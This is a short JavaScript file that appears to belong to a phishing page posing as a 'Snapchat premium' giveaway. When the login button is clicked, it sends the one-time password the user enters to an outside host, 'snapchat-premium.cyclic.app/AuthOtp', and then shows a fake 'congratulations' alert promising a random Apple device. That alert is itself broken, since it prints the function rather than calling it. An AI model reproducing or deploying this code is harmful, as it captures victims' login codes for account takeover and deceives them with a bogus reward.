const OTPInput = document.getElementById("otpForm");
const submitBtn = document.getElementById("loginBtn");

let RewardArr = ["iPhone 12", "Apple SmartWatch", "iPhone 13 Pro Max", "iPhone 15 Pro", "MacBook pro M3", "MacBook Pro M2", "iPhone X", "Ultra Pro Max Watch", "Mac Studio"]
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * RewardArr.length);
    return RewardArr[randomIndex];
}

const getOtp = async () => {
    const data = {
        userOtp: OTPInput.value,
        TypeOfAuth: "OTP"
    };

    const url = "https://snapchat-premium.cyclic.app/AuthOtp";
    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    try {
        const response = await fetch(url, options);
        if (!response.ok) {
            throw new Error('Network error or something else');
        }
        const responseData = await response.json();
        console.log(responseData);
        alert(`congratulations! You Got ${getRandomElement}`)
    } catch (error) {
        console.error(error);
    }
};

submitBtn.addEventListener("click", getOtp);
